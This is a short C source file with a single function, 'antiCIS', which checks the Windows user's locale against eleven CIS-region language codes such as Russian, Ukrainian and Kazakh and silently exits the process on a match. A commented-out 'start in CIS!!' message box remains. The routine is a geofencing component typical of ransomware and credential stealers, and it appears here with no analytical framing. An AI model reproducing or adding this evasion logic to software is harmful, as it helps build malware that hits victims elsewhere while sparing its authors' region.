#include "header.h"

void antiCIS()
{
    wchar_t* lang[11] = { L"az", L"am", L"be", L"kk", L"ky", L"mo", L"ru", L"tg", L"uz", L"ua", L"tk" };

    wchar_t language[100];

    LCID lcid = GetUserDefaultLCID();
    
    if (GetLocaleInfo(lcid, LOCALE_SISO639LANGNAME, language, 100)) {
        for (int i = 0; i < 11; i++) {
            if (!wcscmp(language, lang[i])) {
                //MessageBox(NULL, L"start in CIS!!", L"Info", MB_ICONASTERISK);
                ExitProcess(0);
            }
        }
    }
}
